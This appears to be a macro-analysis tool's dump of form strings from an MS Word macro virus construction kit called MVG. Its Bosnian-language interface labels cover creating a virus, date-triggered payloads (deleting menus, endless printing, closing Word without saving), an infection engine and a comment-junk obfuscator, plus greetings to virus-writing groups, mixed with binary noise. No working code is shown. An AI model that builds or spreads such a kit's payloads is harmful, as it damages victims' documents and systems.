VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x;\��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E?�k&rZڏ4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&D#A��C�y��ɞ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4hI]�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���e�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��hK�GZ@�����&%�K^0�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�v4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@�,[&C�]/|v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���c��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I;�,D�y׵�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w$k_��	�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(�*�!�����ņ���u�B"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��W�>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1�@tқ*��Z'"��j��`U���e��^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RA�C��U�)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�EB Virus Labos           [c] CopyLeft by e[ax]    @
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������<�b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�MVG v1.0�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i12/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:: GREETZ ::�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i12/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i12/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:: O AUTORU ::�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i12/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i12/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:: O MVG-u ::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i12/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i12/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:: KONTAKTI ::�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i12/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i12/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:: izlaz ::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i12/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i12/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� Kreiraj Virus 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i12/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i33/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i33/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i33/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Unesite sekunde (1 - 60, ne 0):
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i33/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i33/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Unesite minute (1 - 60, ne 0):
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i33/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i33/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Unesite sate (1 - 24, ne 0):�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i33/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i33/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i33/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i33/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Unesite dane (1 - 31, pazite za Februar, bez 0):I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i33/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i33/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ako se ne budete pridrzavali uslova u zagradama, payload se nece ni startati. Prije svega:  datum unosite zbog odredjivanja kada zhelite startati dole odabrane payload funkcije. Ako hochesh da se payload starta odmah onda nemoj unositi nikakve cifre u gore navedena polja.y-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i33/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i49/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
- brisanje Tools menija!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i49/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i49/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
- brisanje Insert menija!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i49/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i49/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
- brisanje svih menija!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i49/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i53/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
- !USKORO!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i53/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i69/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i69/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
- printanje do besvijesti!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i69/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i69/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
- unesi tekst koji che se prikazati na radnoj povrsini!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i69/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i69/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
- naglo zatvaranje Worda, bez upita za  snimanje trenutacnog rada!  ;-)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/i69/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i29/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[OIE] v1.0 - Object Infection Engine 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i29/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i29/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[RCJ] v1.0 - Random Comment Junker �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i29/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/gretforma/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ovom prilikom zelim pozdraviti cijeli Bih Underground. Te posebno pozdravljam slijedece ljude:                                                                                                                                                                                                   k04x, rudeboy, Tra[x], E-man, Arp4man,    SnakeLord, BIGFOOOT, te ostalu raju iz BIHnet.ORG koje nisam spomenuo.                                                         Special greetz to:                                                VicodinES  - gdje god da si, ti si najbolji koder danasnjice.                                                             10x  to: Knowdeath, Jackie tw0flower         Greetz to: [moebius], mort, NALA, C - Yoda,                     LifeWire, GigaByte, etc. ... and also greetz goes to:  LineZer0, CodeBreakers, Metaphase, 29a (tha best) and so on. Best viral year to all ppl on Undernet. Thnx once again for ur help...      
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/gretforma/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/gretforma/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Unload me...NOW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/gretforma/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GIF89a�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������ֽ����������޽�έ�罽޵����絵ޭ�֥����ﵵ筭���֜�Δ�֔�Ό��ssޔ��{{΄�甔�ccތ��{{�ss猌�kk�ss�ZZ�{{�ss�cc�kk�ss�JJ�kk�cc�RR�RR�ZZ�RR�JJ�BB�BB�JJ�99�99�99�{s�ZR�ZR�RJ�RJ�JB�RJ�91�91甌ތ�ބ{�{�{s�kc�sk�kc�cZ�ZR�RJ�ZR�cZ�RJ�JB�RJ�B9�B9�91�B9ޜ�眔ޔ�֌�΄{�kc�cZ�JBｵ絭ޭ�筥Ɣ�ޥ����֜�祜ƌ��sk��{�kc�{sƄ{�kc�ZR�ZJ�J9���罵޵�֭����֥���{ބs�sc�{k�sc�kZ�cR�kZ�ZJ�cR�RB�J9�ƽΥ���{県ޔ�΄sތ{քs�kZ�cR�kZ�cR�ZJ�RB���ֵ�������ޜ��{k�sc�kZ�cR�RB��{���ޥ�Δ�ƌ{��s�{k�sc�kZ�cR�{c�cJ������ֽ�ｭ絥ޭ�Μ��sc�cR�ZJ΄k�{c�sZ�cJ�ƽ޵�֔{ΌsƄk�sZ�kR�cJ֭�Υ�֜�Δ{�cR�sZ�kR޽�･��k����νέ�ƥ�֥�Ƅc�sR罥Δsƌk��c�{Z޵�޽��ν������������������޵�甥Μ��{�ޥ�ﭵƌ�ޜ�眥�k{֌�΄�ތ��s{�{�猔�{��ks�s{�ck�ck�Zc�9B�RZ�RZ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*\Ȱ�Ç
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/f�h��Ǝ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d\yr�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�l��i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ʒ7�^�h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(� &Ґ@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h�X�*G�X�j��U���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��hY�g�^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���́
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6��%E�8u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
�ɗ%Q�*YE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i�L�t!α%Q�D�Hq鲨
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_q�t�0�ӆM

$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pU�Vl��[9z�| �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U�2�K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&X�C��9

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2�T �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<p���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8��}	��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���T%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��'@I.!0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x�D�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L�@S�a��Y�Aלt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ؕU6Z$N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c��@8Hѓ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<��x�-�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� �;�l��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ��B�6�x0��w)�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�QBnC%h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
42�O�9'�@5ΈQI夰B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�0O
v��!+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P�J*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1s܂�[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
䒫G�zh��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ռq�1oTsK5ո�F5mĲ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��RI%�\�K���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J3��"	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���
*o 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5�nS	1��1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	v�`r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+0�I(u�q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��l��p��13�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Y�- A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!����%\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p �0�`�	(q�rK*�X
-------------------------------------------------------------------------------
